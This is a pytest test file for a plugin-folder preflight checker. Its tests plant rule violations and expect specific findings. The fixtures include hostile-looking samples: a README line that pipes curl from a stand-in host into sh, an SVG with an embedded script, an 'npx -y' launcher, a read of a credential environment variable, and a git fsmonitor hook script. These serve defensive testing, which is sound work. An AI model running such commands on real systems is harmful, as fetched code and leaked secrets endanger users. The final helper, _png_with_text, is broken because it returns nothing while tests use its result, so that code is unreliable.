# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Transgenia (Centrum Transgenia SAS)
"""The local directory preflight (scripts/directory_preflight.py).

It is Transgenia's own check of a plugin folder before it is submitted to Anthropic's
directory. It is not Anthropic's scanner, and these tests do not claim it is: each one
plants a single violation in a throwaway plugin folder and expects the finding the rule
promises, from the source the rule names (the public checklist, the review portal's
text, this repository's rules, or our own stricter reading).
"""

from __future__ import annotations

import hashlib
import importlib.util
import io
import json
import os
import subprocess
import sys
from collections.abc import Callable
from pathlib import Path
from typing import Any

import pytest

ROOT = Path(__file__).resolve().parents[2]
def _png() -> bytes:
    import struct
    import zlib

    def chunk(kind: bytes, data: bytes) -> bytes:
        return (struct.pack(">I", len(data)) + kind + data
                + struct.pack(">I", zlib.crc32(kind + data) & 0xFFFFFFFF))

    raw = b"".join(b"\x00" + b"\x10\x80\xf0\xff" * 8 for _ in range(8))
    return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", 8, 8, 8, 6, 0, 0, 0))
            + chunk(b"IDAT", zlib.compress(raw)) + chunk(b"IEND", b""))


PNG = _png()
README = "# Sample\n\n" + " ".join(["word"] * 60) + "\n"
MANIFEST: dict[str, Any] = {
    "name": "sample-plugin",
    "version": "1.0.0",
    "description": "A sample plugin used by the tests.",
    "author": {"name": "Sample"},
    "homepage": "https://example.com",
    "license": "MIT",
    "icon": "./.claude-plugin/icon.png",
    "documentationUrl": "https://example.com/docs",
    "supportUrl": "https://example.com/support",
    "privacyPolicyUrl": "https://example.com/privacy",
}


def _preflight() -> Any:
    spec = importlib.util.spec_from_file_location("directory_preflight",
                                                  ROOT / "scripts" / "directory_preflight.py")
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    sys.modules["directory_preflight"] = module
    spec.loader.exec_module(module)
    return module


def put(root: Path, rel: str, content: str | bytes) -> None:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    if isinstance(content, str):
        path.write_text(content, encoding="utf-8")
    else:
        path.write_bytes(content)


def manifest(root: Path, **changes: Any) -> None:
    data = dict(MANIFEST)
    data.update(changes)
    put(root, ".claude-plugin/plugin.json", json.dumps(data, indent=2))


@pytest.fixture()
def plugin(tmp_path: Path) -> Path:
    """A minimal folder that passes: a manifest, a README, a LICENSE and a PNG icon."""
    root = tmp_path / "plugin"
    manifest(root)
    put(root, ".claude-plugin/icon.png", PNG)
    put(root, "README.md", README)
    put(root, "LICENSE", "MIT License\n\nCopyright (c) 2026 Sample\n")
    return root


def findings(root: Path) -> set[tuple[str, str]]:
    report = _preflight().run(root)
    return {(f["severity"], f["code"]) for f in report["findings"]}


def test_a_minimal_folder_has_no_errors_and_no_warnings(plugin: Path) -> None:
    report = _preflight().run(plugin)
    assert report["summary"]["error"] == 0 and report["summary"]["warning"] == 0
    # The four URL fields and the icon are directory listing fields: a note, not a problem.
    assert {f["severity"] for f in report["findings"]} <= {"info"}


def test_the_report_says_it_is_not_anthropics_scanner(plugin: Path,
                                                      capsys: pytest.CaptureFixture[str]) -> None:
    report = _preflight().run(plugin)
    assert report["equivalent_to_anthropic_scanner"] is False
    assert "not Anthropic's scanner" in report["disclaimer"]
    assert _preflight().main([str(plugin)]) == 0
    assert "not Anthropic's scanner" in capsys.readouterr().out


def _unquoted_colon(root: Path) -> None:
    put(root, "skills/a/SKILL.md", "---\nname: a\ndescription: Use when: the user asks\n---\n# A\n")


def _quoted_colon(root: Path) -> None:
    put(root, "skills/a/SKILL.md", '---\nname: a\ndescription: "Use when: the user asks"\n---\n# A\n')


def _symlink(root: Path) -> None:
    try:
        os.symlink("README.md", root / "link.md")
    except (OSError, NotImplementedError):
        pytest.skip("symbolic links are not available here")


def _many_files(root: Path) -> None:
    for number in range(520):
        put(root, f"d/f{number}.md", "x\n")


# (what is planted, how, the finding expected as (severity, code))
VIOLATIONS: list[tuple[str, Callable[[Path], None], tuple[str, str]]] = [
    ("a Python file", lambda r: put(r, "tool.py", "print(1)\n"),
     ("error", "LOCAL_CODE_FILE_TYPE")),
    ("a TypeScript file", lambda r: put(r, "cli.ts", "export {}\n"),
     ("error", "LOCAL_CODE_FILE_TYPE")),
    ("a shell script", lambda r: put(r, "run.sh", "echo hi\n"),
     ("error", "LOCAL_CODE_FILE_TYPE")),
    ("a Dockerfile", lambda r: put(r, "Dockerfile", "FROM scratch\n"),
     ("error", "LOCAL_CODE_FILE_TYPE")),
    ("a shebang inside a Markdown file", lambda r: put(r, "notes.md", "#!/bin/sh\necho hi\n"),
     ("error", "LOCAL_CODE_FILE_TYPE")),
    ("package.json", lambda r: put(r, "package.json", "{}"), ("error", "LOCAL_CODE_FILE_TYPE")),
    ("pnpm-workspace.yaml", lambda r: put(r, "pnpm-workspace.yaml", "packages: []\n"),
     ("error", "LOCAL_CODE_FILE_TYPE")),
    ("pyproject.toml", lambda r: put(r, "pyproject.toml", "[project]\n"),
     ("error", "LOCAL_CODE_FILE_TYPE")),
    ("requirements-dev.txt", lambda r: put(r, "requirements-dev.txt", "pytest\n"),
     ("error", "LOCAL_CODE_FILE_TYPE")),
    ("a NUL byte in a Markdown file", lambda r: put(r, "n.md", b"text\x00more\n"),
     ("error", "LOCAL_CODE_FILE_TYPE")),
    ("a Markdown file that is not UTF-8", lambda r: put(r, "n.md", b"caf\xe9\n"),
     ("error", "LOCAL_CODE_FILE_TYPE")),
    ("a program with a text name", lambda r: put(r, "readme.txt", b"\x7fELF" + b"\x00" * 60),
     ("error", "LOCAL_CODE_FILE_TYPE")),
    ("a zip archive with a Markdown name", lambda r: put(r, "doc.md", b"PK\x03\x04" + b"\x00" * 30),
     ("error", "LOCAL_CODE_FILE_TYPE")),
    ("a program with an image name", lambda r: put(r, "pic.png", b"\x7fELF" + b"\x00" * 60),
     ("error", "LOCAL_CODE_FILE_TYPE")),
    ("a .png that is text", lambda r: put(r, "pic.png", "not an image"),
     ("error", "LOCAL_CODE_FILE_TYPE")),
    ("an .ico file", lambda r: put(r, "i.ico", b"\x00\x00\x01\x00" + b"\x00" * 30),
     ("error", "LOCAL_CODE_FILE_TYPE")),
    ("a .zip file", lambda r: put(r, "a.zip", b"x"), ("error", "LOCAL_CODE_FILE_TYPE")),
    ("a .mcpb bundle", lambda r: put(r, "a.mcpb", b"x"), ("error", "LOCAL_CODE_FILE_TYPE")),
    ("an SVG image", lambda r: put(r, "logo.svg", "<svg xmlns='http://www.w3.org/2000/svg'/>"),
     ("warning", "LOCAL_CODE_FILE_TYPE")),
    ("an SVG with a script", lambda r: put(r, "logo.svg", "<svg><script>alert(1)</script></svg>"),
     ("error", "LOCAL_CODE_FILE_TYPE")),
    ("a suffixless text file the portal does not name", lambda r: put(r, "NOTICE", "Notice\n"),
     ("warning", "LOCAL_CODE_FILE_TYPE")),
    ("a symbolic link", _symlink, ("error", "INVENTORY_GAPS")),
    ("a text file over 256 KiB", lambda r: put(r, "big.md", "a " * 140_000),
     ("error", "DIR_LIMITS")),
    ("more than 512 files", _many_files, ("error", "DIR_LIMITS")),
    ("a command hook", lambda r: put(
        r, "hooks/hooks.json",
        json.dumps({"hooks": {"SessionStart": [{"hooks": [{"type": "command",
                                                           "command": "echo hi"}]}]}})),
     ("error", "LOCAL_CODE_HOOK_COMMAND")),
    ("an http hook (the rule covers hooks of every type)", lambda r: put(
        r, "hooks/hooks.json",
        json.dumps({"hooks": {"Stop": [{"hooks": [{"type": "http", "url": "https://x.example"}]}]}})),
     ("error", "LOCAL_CODE_HOOK_COMMAND")),
    ("a hooks key in plugin.json", lambda r: manifest(r, hooks="./hooks/hooks.json"),
     ("error", "LOCAL_CODE_HOOK_COMMAND")),
    ("a hooks key in a skill's frontmatter", lambda r: put(
        r, "skills/a/SKILL.md",
        '---\nname: a\ndescription: "Use it"\nhooks:\n  PreToolUse: []\n---\n# A\n'),
     ("error", "LOCAL_CODE_HOOK_COMMAND")),
    ("inline shell execution in a command", lambda r: put(
        r, "commands/x.md", '---\ndescription: "Run it"\n---\nRun !`git status` now\n'),
     ("error", "LOCAL_EXEC_INLINE_SHELL")),
    ("a shell block in a command", lambda r: put(
        r, "commands/x.md", '---\ndescription: "Run it"\n---\n```!\nls\n```\n'),
     ("error", "LOCAL_EXEC_INLINE_SHELL")),
    ("a frontmatter that grants the shell", lambda r: put(
        r, "commands/x.md",
        '---\ndescription: "Run it"\nallowed-tools: Bash(git status:*)\n---\nDo it.\n'),
     ("error", "LOCAL_EXEC_PREAPPROVED")),
    ("an agent without a tools list", lambda r: put(
        r, "agents/a.md", '---\nname: a\ndescription: "An agent"\n---\nHelp.\n'),
     ("warning", "AGENT_TOOLS_INHERITED")),
    ("a stdio MCP server", lambda r: manifest(
        r, mcpServers={"x": {"command": "python3", "args": ["a.py"]}}),
     ("error", "LOCAL_CODE_MCP_SERVER")),
    ("an MCP server started by a helper", lambda r: manifest(
        r, mcpServers={"x": {"type": "http", "url": "https://m.example.com",
                             "headersHelper": "./h.sh"}}),
     ("error", "LOCAL_MCP_SERVER")),
    ("a stdio server in .mcp.json", lambda r: put(
        r, ".mcp.json", json.dumps({"mcpServers": {"x": {"command": "node"}}})),
     ("error", "LOCAL_CODE_MCP_SERVER")),
    ("an MCP server declared as a bundle", lambda r: manifest(r, mcpServers="./server.mcpb"),
     ("error", "LOCAL_CODE_MCP_SERVER")),
    ("a remote MCP server on localhost", lambda r: manifest(
        r, mcpServers={"x": {"type": "http", "url": "https://localhost:8080/mcp"}}),
     ("error", "LOCAL_CODE_MCP_SERVER")),
    ("a remote MCP server on a private address", lambda r: manifest(
        r, mcpServers={"x": {"type": "http", "url": "https://192.168.1.5/mcp"}}),
     ("error", "LOCAL_CODE_MCP_SERVER")),
    ("a remote MCP server without https", lambda r: manifest(
        r, mcpServers={"x": {"type": "http", "url": "http://m.example.com/mcp"}}),
     ("error", "LOCAL_CODE_MCP_SERVER")),
    ("a remote MCP server whose URL comes from an option", lambda r: manifest(
        r, mcpServers={"x": {"type": "http", "url": "${user_config.server_url}"}},
        userConfig={"server_url": {"type": "string", "title": "u", "description": "d"}}),
     ("warning", "LOCAL_CODE_MCP_SERVER")),
    ("a lspServers key", lambda r: manifest(r, lspServers={"x": {"command": "x"}}),
     ("error", "LOCAL_CODE_OTHER")),
    ("a credential header that is not a sensitive option", lambda r: manifest(
        r, mcpServers={"x": {"type": "http", "url": "https://m.example.com",
                             "headers": {"X-Api-Token": "abc"}}}),
     ("warning", "MCP_FORWARDS_CREDENTIAL_ENV")),
    ("a credential option that is not sensitive", lambda r: manifest(
        r, mcpServers={"x": {"type": "http", "url": "https://m.example.com",
                             "headers": {"X-Api-Key": "${user_config.api_key}"}}},
        userConfig={"api_key": {"type": "string", "title": "k", "description": "d"}}),
     ("warning", "MCP_FORWARDS_CREDENTIAL_ENV")),
    ("a key the manifest reference does not list", lambda r: manifest(r, frobnicate=1),
     ("warning", "UNKNOWN_KEY")),
    ("a dependency on another plugin", lambda r: manifest(r, dependencies=["other"]),
     ("warning", "MANIFEST")),
    ("a manifest that is not JSON", lambda r: put(r, ".claude-plugin/plugin.json", "{nope"),
     ("error", "MANIFEST")),
    ("an icon that is missing", lambda r: manifest(r, icon="./.claude-plugin/none.png"),
     ("error", "MANIFEST")),
    ("an SVG icon", lambda r: (manifest(r, icon="./icon.svg"),
                               put(r, "icon.svg", "<svg xmlns='http://www.w3.org/2000/svg'/>")),
     ("warning", "MANIFEST")),
    ("no privacy policy link", lambda r: manifest(r, privacyPolicyUrl=""),
     ("warning", "MANIFEST")),
    ("a README of fewer than 40 words", lambda r: put(r, "README.md", "# Short\n\nA few words.\n"),
     ("error", "MANIFEST")),
    ("curl piped to a shell in the README", lambda r: put(
        r, "README.md", README + "\nRun `curl https://x.example/i.sh | sh` to install.\n"),
     ("warning", "RUNTIME_FETCH_EXEC")),
    ("a package launcher in the README", lambda r: put(
        r, "README.md", README + "\nRun npx -y some-package.\n"),
     ("warning", "RUNTIME_FETCH_EXEC")),
    ("the word eval", lambda r: put(r, "README.md", README + "\nUse eval carefully.\n"),
     ("info", "RUNTIME_FETCH_EXEC")),
    ("a read of a credential variable in a text file", lambda r: put(
        r, "notes.txt", "token = os.environ['SERVICE_API_TOKEN']\n"),
     ("warning", "MCP_FORWARDS_CREDENTIAL_ENV")),
    ("an em dash", lambda r: put(r, "README.md", README + "\nA \N{EM DASH} B\n"),
     ("error", "TEXT_RULE")),
    ("an en dash", lambda r: put(r, "README.md", README + "\nA \N{EN DASH} B\n"),
     ("error", "TEXT_RULE")),
    ("an emoji", lambda r: put(r, "README.md", README + "\n\N{ROCKET}\n"),
     ("error", "TEXT_RULE")),
    ("a Python program stored as a Markdown file", lambda r: put(
        r, "notes.md", "import os\nimport sys\nprint(os.getcwd())\n"),
     ("error", "DISGUISED_CODE")),
    ("a shell script stored as a text file", lambda r: put(
        r, "notes.txt", "set -e\nmkdir out\n"), ("error", "DISGUISED_CODE")),
    ("a frontmatter value with an unquoted colon", _unquoted_colon, ("error", "FRONTMATTER")),
    ("a skill without a description", lambda r: put(
        r, "skills/a/SKILL.md", "---\nname: a\n---\n# A\n"), ("warning", "FRONTMATTER")),
    ("no manifest", lambda r: (r / ".claude-plugin" / "plugin.json").unlink(),
     ("error", "MANIFEST")),
    ("no README", lambda r: (r / "README.md").unlink(), ("error", "MANIFEST")),
    # --- the portal's text for v1.6.3 (printed 2026-11-13), and the calibration of this tool on it
    ("a package.json field outside the portal's list", lambda r: put(
        r, "package.json", json.dumps({"name": "x", "scripts": {"build": "tsc"}})),
     ("error", "LOCAL_CODE_UNKNOWN_KEY")),
    ("a package.json that is a list", lambda r: put(r, "package.json", "[]"),
     ("error", "LOCAL_CODE_UNKNOWN_KEY")),
    ("a package.json engines value that is not a plain version", lambda r: put(
        r, "package.json", json.dumps({"name": "x", "engines": {"node": "git+https://x.example/n"}})),
     ("error", "LOCAL_CODE_UNKNOWN_KEY")),
    ("a field outside the list in a remote server's entry", lambda r: manifest(
        r, mcpServers={"x": {"type": "http", "url": "https://m.example.com", "env": {"A": "b"}}}),
     ("error", "LOCAL_CODE_UNKNOWN_KEY")),
    ("an oauth field outside the list", lambda r: manifest(
        r, mcpServers={"x": {"type": "http", "url": "https://m.example.com",
                             "oauth": {"clientId": "c", "clientSecret": "s"}}}),
     ("error", "LOCAL_CODE_UNKNOWN_KEY")),
    ("oauth on a server that is not http or sse", lambda r: manifest(
        r, mcpServers={"x": {"type": "ws", "url": "wss://m.example.com", "oauth": {"clientId": "c"}}}),
     ("error", "LOCAL_CODE_UNKNOWN_KEY")),
    ("a manifest field that Claude Code does not read", lambda r: manifest(r, frobnicate=1),
     ("error", "LOCAL_CODE_UNKNOWN_KEY")),
    ("a .claude-plugin folder that is not the plugin's own", lambda r: put(
        r, "sub/.claude-plugin/plugin.json", json.dumps(MANIFEST)),
     ("error", "LOCAL_CODE_FILE_TYPE")),
    ("a .claude/skills folder", lambda r: put(
        r, ".claude/skills/a/SKILL.md", '---\nname: a\ndescription: "d"\n---\n# A\n'),
     ("error", "LOCAL_CODE_FILE_TYPE")),
    ("a JSON file in egress/", lambda r: put(r, "egress/rules.json", "{}"),
     ("error", "LOCAL_CODE_FILE_TYPE")),
    ("a file in .claude-plugin that is not plugin.json, an image or marketplace.json",
     lambda r: put(r, ".claude-plugin/notes.md", "# Notes\n\nplain\n"),
     ("error", "LOCAL_CODE_FILE_TYPE")),
    ("a .mcp.json in a subfolder", lambda r: put(r, "sub/.mcp.json", "{}"),
     ("error", "LOCAL_CODE_FILE_TYPE")),
    ("a file in output-styles/ that plugin.json leaves out",
     lambda r: put(r, "output-styles/terse.md", "# Terse\n\nplain\n"),
     ("error", "LOCAL_CODE_FILE_TYPE")),
    ("a colon in a name, under the portal's code", lambda r: put(r, "a:b.md", "# x\n"),
     ("error", "LOCAL_CODE_FILE_TYPE")),
    ("a text that names the icon", lambda r: put(r, "notes.txt", "The icon is icon.png.\n"),
     ("warning", "UNREAD_ASSET_REFERENCED")),
    ("the icon named in backticks in the README", lambda r: put(
        r, "README.md", README + "\nThe icon is `.claude-plugin/icon.png`.\n"),
     ("warning", "UNREAD_ASSET_REFERENCED")),
    ("an image in bin/", lambda r: put(r, "bin/logo.png", PNG),
     ("warning", "UNREAD_ASSET_REFERENCED")),
    ("a program that touches the environment and names a credential", lambda r: put(
        r, "tool.py", "import os\nENV = dict(os.environ)\nNAME = 'ODOO_API_KEY'\n"),
     ("warning", "MCP_FORWARDS_CREDENTIAL_ENV")),
    ("a credential in the environment of a local server", lambda r: manifest(
        r, mcpServers={"x": {"command": "python3", "env": {"API_KEY": "${user_config.api_key}"}}},
        userConfig={"api_key": {"type": "string", "title": "k", "description": "d",
                                "sensitive": True}}),
     ("warning", "MCP_FORWARDS_CREDENTIAL_ENV")),
    ("hooks (the portal's note)", lambda r: put(
        r, "hooks/hooks.json",
        json.dumps({"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "echo hi"}]}]}})),
     ("info", "USES_HOOKS")),
    ("a local server (the portal's note)", lambda r: manifest(
        r, mcpServers={"x": {"command": "python3"}}), ("info", "LOCAL_MCP_SERVER")),
    ("a local server (not on claude.ai)", lambda r: manifest(
        r, mcpServers={"x": {"command": "python3"}}), ("info", "STDIO_WEB_UNSUPPORTED")),
    ("the icon, a field of another tool's manifest", lambda r: None,
     ("info", "UNKNOWN_KEY_CROSS_TOOL")),
    ("a well-formed image let through unread", lambda r: None, ("info", "ASSETS_PASSED_UNREAD")),
]


@pytest.mark.parametrize("what,plant,expected", VIOLATIONS, ids=[v[0] for v in VIOLATIONS])
def test_a_planted_violation_is_found(plugin: Path, what: str, plant: Callable[[Path], None],
                                      expected: tuple[str, str]) -> None:
    plant(plugin)
    assert expected in findings(plugin), what


def test_a_quoted_colon_is_fine(plugin: Path) -> None:
    _quoted_colon(plugin)
    assert ("error", "FRONTMATTER") not in findings(plugin)


def test_a_remote_server_at_a_public_https_url_is_accepted(plugin: Path) -> None:
    manifest(plugin, mcpServers={"x": {"type": "http", "url": "https://mcp.example.com/mcp",
                                       "headers": {"X-Api-Key": "${user_config.api_key}"}}},
             userConfig={"api_key": {"type": "string", "title": "k", "description": "d",
                                     "sensitive": True}})
    report = _preflight().run(plugin)
    assert report["summary"]["error"] == 0 and report["summary"]["warning"] == 0


def _bearer(plugin: Path, header: str, sensitive: bool) -> set[tuple[str, str]]:
    manifest(plugin, mcpServers={"x": {"type": "http", "url": "https://mcp.example.com/mcp",
                                       "headers": {"Authorization": header}}},
             userConfig={"api_key": {"type": "string", "title": "k", "description": "d",
                                     "sensitive": sensitive}})
    return findings(plugin)


def test_a_bearer_prefix_on_a_sensitive_option_is_accepted(plugin: Path) -> None:
    # "Authorization: Bearer ${user_config.api_key}" is the usual way to send a key.
    for header in ("Bearer ${user_config.api_key}", "Basic ${user_config.api_key}",
                   "${user_config.api_key}"):
        found = _bearer(plugin, header, sensitive=True)
        assert ("warning", "MCP_FORWARDS_CREDENTIAL_ENV") not in found, header
    # What stays a warning: the option is not sensitive, or a literal or a foreign variable
    # sits next to the reference.
    for header, sensitive in (("Bearer ${user_config.api_key}", False),
                              ("Bearer abcd1234efgh5678", True),
                              ("Bearer ${GITHUB_TOKEN}", True),
                              ("Bearer x${user_config.api_key}", True)):
        assert ("warning", "MCP_FORWARDS_CREDENTIAL_ENV") in _bearer(plugin, header, sensitive), header


def test_a_shell_is_granted_by_the_tools_field_not_by_a_word_elsewhere(plugin: Path) -> None:
    # A description may talk about Bash; only allowed-tools (or tools) grants it.
    put(plugin, "commands/explain.md",
        "---\ndescription: Explain Bash syntax without running commands.\nallowed-tools: Read\n---\nHi\n")
    assert ("error", "LOCAL_EXEC_PREAPPROVED") not in findings(plugin)
    for fields in ("allowed-tools: Read, Bash", "allowed-tools:\n  - Read\n  - Bash",
                   "allowed-tools:\n- Read\n- Bash(git *)", "'Allowed-Tools': [Read, Shell]",
                   "allowed-tools: >-\n  Read\n  PowerShell", "? allowed-tools\n: Bash"):
        put(plugin, "commands/grant.md", f"---\ndescription: d\n{fields}\n---\nHi\n")
        assert ("error", "LOCAL_EXEC_PREAPPROVED") in findings(plugin), fields


def test_a_readme_that_is_a_pipe_is_reported_not_waited_for(plugin: Path) -> None:
    # check_file refuses a pipe; a second, unconditional read of README.md used to block on it.
    import os
    import subprocess
    import sys
    (plugin / "README.md").unlink()
    os.mkfifo(plugin / "README.md")
    done = subprocess.run([sys.executable, "-I", str(ROOT / "scripts" / "directory_preflight.py"),
                           str(plugin), "--json"], capture_output=True, text=True, timeout=30,
                          check=False)
    report = json.loads(done.stdout)
    assert any(f["code"] == "INVENTORY_GAPS" and f["path"] == "README.md"
               for f in report["findings"])
    assert not any(f["path"] == "README.md" and "words" in f["message"]
                   for f in report["findings"])


def test_the_word_eval_is_a_note_and_never_a_failure(plugin: Path) -> None:
    put(plugin, "README.md", README + "\nThe eval word appears here.\n")
    report = _preflight().run(plugin)
    assert report["summary"]["error"] == 0 and report["summary"]["warning"] == 0
    assert ("info", "RUNTIME_FETCH_EXEC") in findings(plugin)


def test_the_icon_of_the_manifest_a_markdown_image_and_an_svg_are_not_unread_asset_references(
        plugin: Path) -> None:
    # The manifest's own icon is the documented way to name an image, but nothing in the portal's
    # reviews shows that it is exempt: it is a note and never a warning. That is an assumption,
    # kept so that the edition's gate stays clean, and the note says so. A Markdown image is how
    # the checklist says to show one, and the portal did not count the SVG icon of v1.6.3.
    put(plugin, "README.md", README + "\n![logo](./.claude-plugin/icon.png)\n")
    put(plugin, "icon.svg", "<svg xmlns='http://www.w3.org/2000/svg'/>")
    put(plugin, "notes.txt", "The vector icon is icon.svg.\n")
    found = findings(plugin)
    assert ("warning", "UNREAD_ASSET_REFERENCED") not in found
    assert ("info", "UNREAD_ASSET_REFERENCED") in found


def test_a_name_inside_another_name_is_not_a_reference_to_an_image(plugin: Path) -> None:
    put(plugin, "notes.txt", "See favicon.png, my-icon.png and the_icon.png.\n")
    assert ("warning", "UNREAD_ASSET_REFERENCED") not in findings(plugin)


def test_the_icon_of_another_manifest_is_a_reference_but_not_the_plugins_own(plugin: Path) -> None:
    # What the portal did with v1.6.3: the edition's manifest, nested in the root plugin, names
    # its PNG and is listed; the root's own manifest names an image too and is not. The own
    # manifest is a note here, never a warning: an assumption (section 4a of
    # docs/directory-channel.md), because one image and one nested manifest cannot show it.
    put(plugin, "sub/.claude-plugin/plugin.json", json.dumps(MANIFEST))
    report = _preflight().run(plugin)
    named = [(f["severity"], f["path"]) for f in report["findings"]
             if f["code"] == "UNREAD_ASSET_REFERENCED"]
    assert sorted(named) == [("info", ".claude-plugin/plugin.json"),
                             ("warning", "sub/.claude-plugin/plugin.json")]


def test_a_nested_claude_plugin_folder_counts_only_when_it_is_not_the_plugins_own(
        plugin: Path) -> None:
    put(plugin, "sub/.claude-plugin/plugin.json", json.dumps(MANIFEST))
    put(plugin, "sub/.claude-plugin/icon.png", PNG)
    put(plugin, "sub/README.md", README)
    report = _preflight().run(plugin)
    folders = {f["path"] for f in report["findings"]
               if f["code"] == "LOCAL_CODE_FILE_TYPE" and f["message"].startswith("a .claude-plugin")}
    assert folders == {"sub/.claude-plugin"}
    # Submitted with that folder as the plugin path, the same files are the plugin's own.
    assert _preflight().run(plugin / "sub")["summary"]["error"] == 0


def test_a_package_json_is_read_strictly_and_the_report_says_the_portal_does_not_say_so(
        plugin: Path) -> None:
    # The portal names "a package manager configuration file such as pnpm-workspace.yaml" and, in
    # the same text, lists the fields a package.json may hold: it expects some package.json to
    # pass. Refusing the file by type is our strict reading, so it is attributed to our caution,
    # says that it is not known, and the fields are judged by LOCAL_CODE_UNKNOWN_KEY alone.
    put(plugin, "package.json", json.dumps({"name": "x", "scripts": {"build": "tsc"}}))
    report = _preflight().run(plugin)
    by_file = [f for f in report["findings"] if f["path"] == "package.json"]
    file_type = [f for f in by_file if f["code"] == "LOCAL_CODE_FILE_TYPE"]
    assert len(file_type) == 1
    assert file_type[0]["source"] == "caution" and "not known" in file_type[0]["message"]
    assert not any("by another name" in f["message"] for f in by_file)
    assert any(f["code"] == "LOCAL_CODE_UNKNOWN_KEY" and "'scripts'" in f["message"]
               for f in by_file)


def test_a_manifest_that_is_not_called_package_json_is_still_named_as_a_package_manifest(
        plugin: Path) -> None:
    put(plugin, "manifest.json", json.dumps({"name": "x", "scripts": {"build": "tsc"}}))
    messages = [f["message"] for f in _preflight().run(plugin)["findings"]
                if f["path"] == "manifest.json"]
    assert any("by another name" in m for m in messages)


def test_the_icon_findings_are_the_validators_and_say_what_it_accepts(plugin: Path) -> None:
    # The public checklist has no row about the icon: these checks and this advice are the ones of
    # Claude Code's `claude plugin validate --profile directory` (2.1.325), which advises a square
    # PNG or JPEG of 512 to 2048 pixels under 2 MB and says that SVG and WebP are not accepted.
    def icon_findings() -> list[tuple[str, str]]:
        return [(f["severity"], f["source"]) for f in _preflight().run(plugin)["findings"]
                if f["code"] == "MANIFEST" and "icon" in f["message"]]

    # A missing icon file is an error here because the listing would have no icon, and that is our
    # reading: the validator only warns, so the source is not the validator.
    manifest(plugin, icon="./.claude-plugin/missing.png")
    assert icon_findings() == [("error", "caution")]
    manifest(plugin, icon="./icon.webp")
    put(plugin, "icon.webp", b"RIFF\x04\x00\x00\x00WEBP")
    assert icon_findings() == [("warning", "validator")]
    # The validator's limit is 2 MiB (read on 2.1.325: ICON_INVALID above 2,097,152 bytes), checked
    # for a PNG or JPEG too: the limit itself passes, one byte more is a warning.
    manifest(plugin, icon="./big.png")
    room = 2 * 1024 * 1024 - len(_png_with_text(b""))
    put(plugin, "big.png", _png_with_text(b"x" * room))
    assert (plugin / "big.png").stat().st_size == 2 * 1024 * 1024
    assert icon_findings() == []
    put(plugin, "big.png", _png_with_text(b"x" * (room + 1)))
    assert icon_findings() == [("warning", "validator")]
    put(plugin, "big.png", _png_with_text(b"x" * 1000))
    assert icon_findings() == []
    manifest(plugin, icon=None)
    report = _preflight().run(plugin)
    none = [f for f in report["findings"] if f["code"] == "MANIFEST" and "icon" in f["message"]]
    assert [(f["severity"], f["source"]) for f in none] == [("warning", "validator")]
    assert "ICON_MISSING" in none[0]["message"]
    # The validator passes an https URL as the icon (read on 2.1.325): there is no file to look for.
    manifest(plugin, icon="https://example.com/icon.png")
    assert icon_findings() == []


def test_the_report_never_crashes_on_a_console_that_cannot_encode_a_name(
        plugin: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    # A Windows pipe or console often writes cp1252, which has no Chinese or Cyrillic: the text
    # report writes the character as an escape, and the exit status stays the checker's.
    try:
        put(plugin, "\u4e2d\u6587.md", README)
    except OSError:
        pytest.skip("this file system refuses a non-ASCII name")
    raw = io.BytesIO()
    console = io.TextIOWrapper(raw, encoding="cp1252", errors="strict", write_through=True)
    monkeypatch.setattr(sys, "stdout", console)
    status = _preflight().main([str(plugin)])
    console.flush()
    assert status in (0, 1)
    assert b"\\u4e2d" in raw.getvalue()


def test_tracked_mode_does_not_run_a_program_named_by_the_repositorys_own_config(
        plugin: Path, tmp_path: Path) -> None:
    # git runs the program of core.fsmonitor when it looks at a tree: the folder that is being
    # judged must not be able to make this checker run it.
    marker = tmp_path / "ran"
    hook = tmp_path / "fsmonitor.sh"
    hook.write_text(f"#!/bin/sh\ntouch '{marker}'\nprintf '\\0'\n", encoding="utf-8")
    hook.chmod(0o755)

    def git(*args: str) -> None:
        subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@example.invalid", *args],
                       cwd=plugin, check=True, capture_output=True)

    try:
        git("init", "-q")
        git("add", "-A")
        git("commit", "-q", "-m", "x")
        git("config", "core.fsmonitor", str(hook))
    except (OSError, subprocess.CalledProcessError):
        pytest.skip("git is not usable here")
    subprocess.run(["git", "ls-files"], cwd=plugin, check=False, capture_output=True)
    if not marker.exists():
        pytest.skip("this git does not run core.fsmonitor for ls-files")
    marker.unlink()
    assert _preflight().main([str(plugin), "--tracked"]) == 0
    assert not marker.exists()


def test_a_tracked_name_that_is_not_utf8_is_reported_not_a_crash(plugin: Path) -> None:
    raw = os.fsencode(str(plugin)) + b"/caf\xe9.md"
    try:
        with open(raw, "wb") as handle:
            handle.write(README.encode())
    except OSError:
        pytest.skip("this file system refuses a name that is not UTF-8")

    def git(*args: str) -> None:
        subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@example.invalid", *args],
                       cwd=plugin, check=True, capture_output=True)

    try:
        git("init", "-q")
        git("add", "-A")
    except (OSError, subprocess.CalledProcessError):
        pytest.skip("git is not usable here")
    report = _preflight().run(plugin, tracked=True)
    assert any(f["code"] == "INVENTORY_GAPS" and "UTF-8" in f["message"]
               for f in report["findings"])


def test_a_config_file_that_plugin_json_lists_is_read_and_a_hooks_file_is_never_renamed(
        plugin: Path) -> None:
    server = {"mcpServers": "./config/.mcp.json"}
    put(plugin, "config/.mcp.json", json.dumps({"mcpServers": {}}))
    manifest(plugin, **server)
    put(plugin, "other/hooks.json", json.dumps({"hooks": {}}))
    report = _preflight().run(plugin)
    misplaced = {f["path"]: f["message"] for f in report["findings"]
                 if f["code"] == "LOCAL_CODE_FILE_TYPE"
                 and "does not read at that place" in f["message"]}
    assert "config/.mcp.json" not in misplaced  # listed in plugin.json: Claude Code reads it
    assert "other/hooks.json" in misplaced
    assert "rename it or" not in misplaced["other/hooks.json"]
    assert "remove it" in misplaced["other/hooks.json"]


def _png_with_text(text: bytes) -> bytes:
    """The sample PNG with a tEXt chunk in front of IEND: where a message can ride in an image."""
    import struct
    import zlib

    body = b"Comment\x00" + text
    chunk = (struct.pack(">I", len(body)) + b"tEXt" + body
             + struct.pack(">I", zlib.crc32(b"tEXt" + body) & 0xFFFFFFFF))
    assert PNG.endswith(b"\x00\x00\x00\x00IEND\xaeB`\x82")
